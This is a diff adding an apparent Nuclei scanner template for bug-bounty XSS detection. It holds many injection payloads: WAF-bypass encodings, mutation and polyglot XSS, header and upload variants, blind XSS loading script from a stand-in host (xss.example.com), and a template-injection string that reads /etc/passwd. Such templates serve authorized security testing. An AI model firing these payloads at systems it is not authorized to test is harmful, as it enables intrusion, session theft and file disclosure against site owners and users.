@@ -1,0 +1,463 @@
+id: bug-bounty-xss-ultimate
+
+info:
+  name: Ultimate XSS Detection - Bug Bounty Arsenal
+  author: ezrec
+  severity: high
+  description: |
+    Ultimate XSS detection with WAF bypasses, advanced payloads from HackerOne reports,
+    GitHub research, and real-world bug bounty findings. Includes reflected, stored, 
+    DOM-based, blind, and mutation XSS techniques.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-79
+  tags: xss,bug-bounty,reflected-xss,stored-xss,dom-xss,waf-bypass,mutation-xss
+
+http:
+  # === BASIC XSS DETECTION ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=<script>alert('XSS')</script>"
+      - "{{BaseURL}}/search?query=<script>alert('XSS')</script>"
+      - "{{BaseURL}}/s?q=<script>alert('XSS')</script>"
+      - "{{BaseURL}}/find?search=<script>alert('XSS')</script>"
+      - "{{BaseURL}}/?q=<script>alert('XSS')</script>"
+      - "{{BaseURL}}/?search=<script>alert('XSS')</script>"
+      - "{{BaseURL}}/?query=<script>alert('XSS')</script>"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "<script>alert('XSS')</script>"
+          - "<script>alert(\"XSS\")</script>"
+          - "alert('XSS')"
+          - "alert(\"XSS\")"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: basic_xss
+        regex:
+          - '<script[^>]*>alert\([^)]*\)</script>'
+          - 'alert\([^)]*\)'
+
+  # === WAF BYPASS TECHNIQUES (CloudFlare, AWS WAF, Akamai, etc.) ===
+  - method: GET
+    path:
+      # CloudFlare Bypasses
+      - "{{BaseURL}}/search?q=<svg/onload=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<img src=x onerror=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<iframe src=javascript:alert('XSS')>"
+      - "{{BaseURL}}/search?q=<body onload=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<marquee onstart=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<details open ontoggle=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<audio src=x onerror=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<video src=x onerror=alert('XSS')>"
+      
+      # Case Variations
+      - "{{BaseURL}}/search?q=<ScRiPt>alert('XSS')</ScRiPt>"
+      - "{{BaseURL}}/search?q=<SCRIPT>alert('XSS')</SCRIPT>"
+      - "{{BaseURL}}/search?q=<script>Alert('XSS')</script>"
+      - "{{BaseURL}}/search?q=<script>ALERT('XSS')</script>"
+      
+      # Encoding Bypasses
+      - "{{BaseURL}}/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E"
+      - "{{BaseURL}}/search?q=%3cscript%3ealert('XSS')%3c/script%3e"
+      - "{{BaseURL}}/search?q=&#60;script&#62;alert('XSS')&#60;/script&#62;"
+      - "{{BaseURL}}/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;"
+      
+      # Double Encoding
+      - "{{BaseURL}}/search?q=%253Cscript%253Ealert('XSS')%253C/script%253E"
+      - "{{BaseURL}}/search?q=%2527%253E%253Cscript%253Ealert('XSS')%253C/script%253E"
+      
+      # Unicode Bypasses
+      - "{{BaseURL}}/search?q=\u003cscript\u003ealert('XSS')\u003c/script\u003e"
+      - "{{BaseURL}}/search?q=\x3cscript\x3ealert('XSS')\x3c/script\x3e"
+      
+      # Hex Encoding
+      - "{{BaseURL}}/search?q=\x3Cscript\x3Ealert('XSS')\x3C/script\x3E"
+      - "{{BaseURL}}/search?q=\x3c\x73\x63\x72\x69\x70\x74\x3ealert('XSS')\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "alert('XSS')"
+          - "onerror=alert"
+          - "onload=alert"
+          - "onstart=alert"
+          - "ontoggle=alert"
+          - "javascript:alert"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: waf_bypass_xss
+        regex:
+          - 'onerror=alert\([^)]*\)'
+          - 'onload=alert\([^)]*\)'
+          - 'javascript:alert\([^)]*\)'
+
+  # === ADVANCED WAF BYPASSES FROM REAL BUG BOUNTY REPORTS ===
+  - method: GET
+    path:
+      # Mutation XSS (mXSS)
+      - "{{BaseURL}}/search?q=<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')>\">"
+      - "{{BaseURL}}/search?q=<svg><script>alert('XSS')</script></svg>"
+      - "{{BaseURL}}/search?q=<math><mtext><script>alert('XSS')</script></mtext></math>"
+      
+      # Filter Evasion
+      - "{{BaseURL}}/search?q=<img/src=x/onerror=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<img\nsrc=x\nonerror=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<img\tsrc=x\tonerror=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<img\rsrc=x\ronerror=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<img\x09src=x\x09onerror=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<img\x0asrc=x\x0aonerror=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<img\x0dsrc=x\x0donerror=alert('XSS')>"
+      
+      # Comment Injection
+      - "{{BaseURL}}/search?q=<img src=x onerror=alert('XSS')<!--"
+      - "{{BaseURL}}/search?q=--><img src=x onerror=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<img src=x onerror=alert('XSS')//>"
+      
+      # Attribute Injection
+      - "{{BaseURL}}/search?q=\" onmouseover=alert('XSS') x=\""
+      - "{{BaseURL}}/search?q=' onmouseover=alert('XSS') x='"
+      - "{{BaseURL}}/search?q=` onmouseover=alert('XSS') x=`"
+      
+      # Context Breaking
+      - "{{BaseURL}}/search?q=\"><script>alert('XSS')</script>"
+      - "{{BaseURL}}/search?q='><script>alert('XSS')</script>"
+      - "{{BaseURL}}/search?q=`><script>alert('XSS')</script>"
+      - "{{BaseURL}}/search?q=</script><script>alert('XSS')</script>"
+      - "{{BaseURL}}/search?q=</title><script>alert('XSS')</script>"
+      - "{{BaseURL}}/search?q=</textarea><script>alert('XSS')</script>"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "alert('XSS')"
+          - "onerror=alert"
+          - "onmouseover=alert"
+          - "onload=alert"
+          - "<script>alert"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: advanced_xss
+        regex:
+          - 'on[a-z]+=alert\([^)]*\)'
+          - '<script[^>]*>alert\([^)]*\)'
+
+  # === POLYGLOT XSS PAYLOADS ===
+  - method: GET
+    path:
+      # Famous polyglots from @0xsobky, @garethheyes, etc.
+      - "{{BaseURL}}/search?q=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>"
+      - "{{BaseURL}}/search?q=\"'><img src=x onerror=alert('XSS')>"
+      - "{{BaseURL}}/search?q=';alert('XSS');//"
+      - "{{BaseURL}}/search?q=\";alert('XSS');//"
+      - "{{BaseURL}}/search?q=</script><svg/onload=alert('XSS')>"
+      - "{{BaseURL}}/search?q=<svg/onload=alert('XSS')>"
+      
+      # Multi-context polyglots
+      - "{{BaseURL}}/search?q=';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "alert('XSS')"
+          - "alert(String.fromCharCode"
+          - "onerror=alert"
+          - "onload=alert"
+          - "oNcliCk=alert"
+          - "oNloAd=alert"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: polyglot_xss
+        regex:
+          - 'alert\([^)]*\)'
+          - 'on[a-zA-Z]+=alert\([^)]*\)'
+
+  # === DOM-BASED XSS DETECTION ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/#<script>alert('DOM-XSS')</script>"
+      - "{{BaseURL}}/#<img src=x onerror=alert('DOM-XSS')>"
+      - "{{BaseURL}}/#<svg onload=alert('DOM-XSS')>"
+      - "{{BaseURL}}/page.html#<script>alert('DOM-XSS')</script>"
+      - "{{BaseURL}}/search?q=test#<script>alert('DOM-XSS')</script>"
+      
+      # Hash-based DOM XSS
+      - "{{BaseURL}}/#javascript:alert('DOM-XSS')"
+      - "{{BaseURL}}/#data:text/html,<script>alert('DOM-XSS')</script>"
+      
+      # Fragment identifier XSS
+      - "{{BaseURL}}/page#<img src=x onerror=alert('DOM-XSS')>"
+      - "{{BaseURL}}/app#/user/<script>alert('DOM-XSS')</script>"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "alert('DOM-XSS')"
+          - "javascript:alert"
+          - "data:text/html"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: dom_xss
+        regex:
+          - '#.*alert\([^)]*\)'
+          - 'javascript:alert\([^)]*\)'
+
+  # === BLIND XSS DETECTION ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/contact?name=<script src=//xss.example.com/blind></script>"
+      - "{{BaseURL}}/feedback?message=<script src=//xss.example.com/blind></script>"
+      - "{{BaseURL}}/comment?text=<script src=//xss.example.com/blind></script>"
+      - "{{BaseURL}}/support?issue=<script src=//xss.example.com/blind></script>"
+      
+      # Image-based blind XSS
+      - "{{BaseURL}}/contact?name=<img src=//xss.example.com/blind.png>"
+      - "{{BaseURL}}/feedback?message=<link rel=stylesheet href=//xss.example.com/blind.css>"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+    extractors:
+      - type: regex
+        name: blind_xss
+        regex:
+          - '<script src=//[^>]+></script>'
+          - '<img src=//[^>]+>'
+
+  # === TEMPLATE INJECTION TO XSS ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q={{7*7}}<script>alert('XSS')</script>"
+      - "{{BaseURL}}/search?q=${7*7}<script>alert('XSS')</script>"
+      - "{{BaseURL}}/search?q=#{7*7}<script>alert('XSS')</script>"
+      - "{{BaseURL}}/search?q={{constructor.constructor('alert(\"XSS\")')()}}"
+      - "{{BaseURL}}/search?q={{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}<script>alert('XSS')</script>"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "49<script>alert"
+          - "alert('XSS')"
+          - "constructor.constructor"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: template_xss
+        regex:
+          - '49<script[^>]*>alert\([^)]*\)'
+          - 'constructor.*alert\([^)]*\)'
+
+  # === JSONP XSS ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/jsonp?callback=<script>alert('XSS')</script>"
+      - "{{BaseURL}}/jsonp?callback=alert('XSS')"
+      - "{{BaseURL}}/api/callback?callback=alert('XSS')"
+      - "{{BaseURL}}/api/jsonp?callback=alert('XSS');//"
+      - "{{BaseURL}}/api/jsonp?callback=/**/alert('XSS');//"
+      - "{{BaseURL}}/api/jsonp?callback=alert('XSS')/*"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "alert('XSS')"
+          - "<script>alert('XSS')</script>"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: jsonp_xss
+        regex:
+          - 'callback.*alert\([^)]*\)'
+
+  # === HEADER-BASED XSS ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=test"
+
+    headers:
+      X-Forwarded-For: "<script>alert('XSS')</script>"
+      User-Agent: "<script>alert('XSS')</script>"
+      Referer: "<script>alert('XSS')</script>"
+      X-Real-IP: "<script>alert('XSS')</script>"
+      X-Originating-IP: "<script>alert('XSS')</script>"
+      X-Remote-IP: "<script>alert('XSS')</script>"
+      X-Client-IP: "<script>alert('XSS')</script>"
+      X-Host: "<script>alert('XSS')</script>"
+      X-Forwarded-Host: "<script>alert('XSS')</script>"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "<script>alert('XSS')</script>"
+          - "alert('XSS')"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: header_xss
+        regex:
+          - '<script[^>]*>alert\([^)]*\)</script>'
+
+  # === POST-BASED XSS WITH ADVANCED PAYLOADS ===
+  - method: POST
+    path:
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/contact"
+      - "{{BaseURL}}/feedback"
+      - "{{BaseURL}}/comment"
+      - "{{BaseURL}}/review"
+      - "{{BaseURL}}/message"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/register"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: |
+      q=<svg/onload=alert('XSS')>&search=<img src=x onerror=alert('XSS')>&query=<iframe src=javascript:alert('XSS')>&name=<body onload=alert('XSS')>&message=<marquee onstart=alert('XSS')>&comment=<details open ontoggle=alert('XSS')>&content=<audio src=x onerror=alert('XSS')>&text=<video src=x onerror=alert('XSS')>&body=<script>alert('XSS')</script>&description=<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')\">\">&title=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>&email=\"><script>alert('XSS')</script>&username='><script>alert('XSS')</script>&password=`><script>alert('XSS')</script>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "alert('XSS')"
+          - "onerror=alert"
+          - "onload=alert"
+          - "onstart=alert"
+          - "ontoggle=alert"
+          - "oNcliCk=alert"
+          - "oNloAd=alert"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: post_xss
+        regex:
+          - 'on[a-zA-Z]+=alert\([^)]*\)'
+          - '<script[^>]*>alert\([^)]*\)</script>'
+
+  # === FILE UPLOAD XSS ===
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/file-upload"
+      - "{{BaseURL}}/avatar-upload"
+      - "{{BaseURL}}/image-upload"
+
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+    body: |
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="file"; filename="<script>alert('XSS')</script>.jpg"
+      Content-Type: image/jpeg
+
+      ÿØÿà<script>alert('XSS')</script>
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        words:
+          - "<script>alert('XSS')</script>"
+          - "alert('XSS')"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: upload_xss
+        regex:
+          - 'filename="[^"]*<script[^>]*>alert\([^)]*\)</script>[^"]*"'
+
+  # === SVG XSS PAYLOADS ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS')\"/>"
+      - "{{BaseURL}}/search?q=<svg><script>alert('XSS')</script></svg>"
+      - "{{BaseURL}}/search?q=<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>"
+      - "{{BaseURL}}/search?q=<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert('XSS')</script></svg>#x\"/>"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "alert('XSS')"
+          - "xmlns=\"http://www.w3.org/2000/svg\""
+        condition: or
+
+    extractors:
+      - type: regex
+        name: svg_xss
+        regex:
+          - '<svg[^>]*onload="alert\([^)]*\)"[^>]*/>'
+          - '<svg[^>]*><script>alert\([^)]*\)</script></svg>'
